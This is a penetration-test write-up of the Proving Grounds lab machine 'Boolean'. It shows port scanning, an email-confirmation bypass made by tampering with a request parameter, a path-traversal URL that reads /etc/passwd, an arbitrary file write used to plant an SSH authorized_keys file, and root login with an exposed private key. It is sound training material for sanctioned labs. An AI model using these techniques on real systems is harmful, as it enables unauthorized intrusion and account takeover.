# Report-Boolean

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Boolean

Target IP Address: 192.168.227.231

Operating System: Linux

## Information Gathering:

Full Nmap scan of all ports:

```bash
nmap -sC -sV -p- 192.168.227.231
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 12:36 +0100
Nmap scan report for 192.168.227.231
Host is up (0.034s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open   http
| http-title: Boolean
|_Requested resource was http://192.168.227.231/login
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
3000/tcp  closed ppp
33017/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Development
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.98%I=7%D=1/20%Time=696F6949%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,55,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;
SF:\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,55,"H
SF:TTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20charset=
SF:UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\n\r\n")%r(FourOhFourRequest,55,"HTTP/1\.0\x20403\x20Forbid
SF:den\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\
SF:x200\r\n\r\n")%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(D
SF:NSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq,1
SF:C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCookie,
SF:1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\n\r\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:\r\n")%r(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LANDesk-
SF:RC,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServer,1C
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\n\r\n")%r(NotesRPC,1C,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\n\r\n")%r(JavaRMI,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(WMSRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(oracle-tns,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(ms-sql-s
SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(afp,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(giop,1C,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.07 seconds

```

Enumeration of port 80 using a browser:

<img width="1206" height="683" alt="Pasted image 20260120124143" src="https://github.com/user-attachments/assets/6f8578e4-8d74-47bb-a436-794af060faff" />

```
sudo gobuster dir -w '/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt' -u http://192.168.227.231 -t 42 -b 400,401,403,404
```

<img width="1063" height="463" alt="Pasted image 20260120124417" src="https://github.com/user-attachments/assets/ba413e88-456a-475d-ba68-8a3c51336fd5" />

<img width="1206" height="683" alt="Pasted image 20260120124356" src="https://github.com/user-attachments/assets/1a7de789-3178-4efa-a120-d997b9cfa1b1" />


The web application exposed a user registration and authentication functionality.

## Initial Access

### 1)Vulnerability Exploited: Business Logic Flaw – Email Confirmation Bypass

Vulnerability Explanation: The email confirmation mechanism relied on a client-controlled parameter to determine account verification status. 
By modifying this parameter, email confirmation could be bypassed, allowing account activation without access to the target email inbox.


An account was created using the web application registration functionality. 
Upon login, the application required email confirmation before granting access.

<img width="850" height="257" alt="Pasted image 20260120141101" src="https://github.com/user-attachments/assets/62063c50-53b2-4583-9a14-e2473099f6ae" />

<img width="884" height="561" alt="Pasted image 20260120141042" src="https://github.com/user-attachments/assets/6a281205-1d53-4376-b53d-7582210cef4b" />

By intercepting the email confirmation request with Burp Suite, it was observed that the account verification status was controlled by the client-side parameter "confirmed". 
This parameter was modified from false to true while preserving the original request structure.

```
user%5Bconfirmed%5D=True
```

<img width="880" height="547" alt="Pasted image 20260120141304" src="https://github.com/user-attachments/assets/e8443096-e901-4dcf-a273-d72fa9334284" />


After sending the modified request, the server accepted the confirmation and the account was successfully activated, allowing authenticated access to the application.

<img width="1198" height="595" alt="Pasted image 20260120125410" src="https://github.com/user-attachments/assets/8ff1f374-5651-4d8c-88aa-a81774d1b300" />

### 2)Vulnerability Exploited: Path Traversal / Arbitrary File Read

Vulnerability Explanation: The application failed to properly sanitize user-supplied file path parameters. 
This allowed directory traversal sequences to be used to read arbitrary files from the underlying filesystem.

### Exploitation
After authentication, a file download functionality was identified that allowed user-controlled input to define both the file name and directory path. 
By manipulating the path parameter, directory traversal sequences could be used to read files outside the intended directory.
http://192.168.227.231/?cwd=&file=shell.php&download=true

<img width="1198" height="595" alt="Pasted image 20260120125718" src="https://github.com/user-attachments/assets/00482182-1081-4e75-8c13-948e1356bdae" />

This behavior was confirmed by successfully retrieving sensitive system files such as /etc/passwd through the download functionality. 
http://192.168.227.231/?cwd=../../../../../etc/&file=passwd&download=true

<img width="769" height="540" alt="Pasted image 20260120130028" src="https://github.com/user-attachments/assets/61856247-c889-4965-ba46-bf50b3541584" />

### 3)Vulnerability Exploited: Arbitrary File Write

Vulnerability Explanation: The same file handling functionality allowed user-controlled input to write files to arbitrary locations on the filesystem. 
This was abused to upload an SSH authorized_keys file, resulting in unauthorized SSH access to the system.

### Exploitation:

After identifying the arbitrary file write capability, the .ssh directory of the user "remi" was accessed. 
An SSH public key was uploaded as an authorized_keys file, allowing key-based authentication to the target system.

<img width="1196" height="470" alt="Pasted image 20260120132625" src="https://github.com/user-attachments/assets/a68d1d44-4c14-42b3-bc48-b5639e4b42af" />

https://mqt.gitbook.io/oscp-notes/ssh-keys?source=post_page-----9c7f5b963559---------------------------------------


Command:

```
ssh-keygen
```
The generated public key (id_rsa.pub) was renamed to authorized_keys and uploaded to the /home/remi/.ssh directory on the target system. This allowed the attacker’s private key to be accepted for SSH authentication.

The private key was secured locally to ensure proper permissions prior to authentication.

```bash
chmod 600 id_rsa
```

Using the generated private key, an SSH connection was established to the target system as the user "remi".


```bash
ssh -i id_rsa remi@192.168.227.231
```

<img width="580" height="265" alt="Pasted image 20260120134707" src="https://github.com/user-attachments/assets/7d617b4b-1182-447e-a22f-9e421ac2eba0" />

As a result, authenticated SSH access was obtained as the user "remi".


## Privileged Escalation


## Vulnerability Exploited: Exposure of Root SSH Private Key

Vulnerability Explanation: A private SSH key belonging to the root user was accessible from the compromised system. 
This allowed direct SSH authentication as root without requiring a password. 
By leveraging the exposed private key, full administrative access to the system was obtained.


## Enumeration:


<img width="580" height="55" alt="Pasted image 20260120134818" src="https://github.com/user-attachments/assets/21f6b465-a4ff-486a-a316-1282990c8a05" />


## Exploitation:

```bash
ssh -i root root@127.0.0.1
```
```
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22
```

```bash
ssh -vvv -i root root@127.0.0.1
```
```
...
Will attempt key: remi@boolean RSA SHA256:qoVo/vsehq1vBFSI3JadcLV91QZHPMMqn98NQ+DeYM4 agent
debug1: Will attempt key: remi@boolean RSA SHA256:VU4PLIlgi3D8yQeuregm0CFm/hVakL0cfT2boX90SXQ agent
debug1: Will attempt key: remi@boolean RSA SHA256:YkeaqAEm60L+fZ3T5lm6fQT11+H/kivvCHwPeGITuBg agent
...
 Offering public key: remi@boolean RSA SHA256:qoVo/vsehq1vBFSI3JadcLV91QZHPMMqn98NQ+DeYM4 agent
debug3: send packet: type 50
debug2: we sent a publickey packet, wait for reply
debug3: receive packet: type 51
debug1: Authentications that can continue: publickey,password
debug1: Offering public key: remi@boolean RSA SHA256:VU4PLIlgi3D8yQeuregm0CFm/hVakL0cfT2boX90SXQ agent
debug3: send packet: type 50
debug2: we sent a publickey packet, wait for reply
debug3: receive packet: type 51
debug1: Authentications that can continue: publickey,password
debug1: Offering public key: remi@boolean RSA SHA256:YkeaqAEm60L+fZ3T5lm6fQT11+H/kivvCHwPeGITuBg agent
debug3: send packet: type 50
debug2: we sent a publickey packet, wait for reply
debug3: receive packet: type 1
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
```

To ensure that only the target private key was used, SSH was executed with the IdentitiesOnly option enabled.
```bash
ssh -o IdentitiesOnly=yes -i ./root root@127.0.0.1
```


<img width="592" height="235" alt="Pasted image 20260120135734" src="https://github.com/user-attachments/assets/0ffb0283-d8d4-4fe3-86bf-2437979ca071" />


As a result, a successful SSH connection was established as the root user.







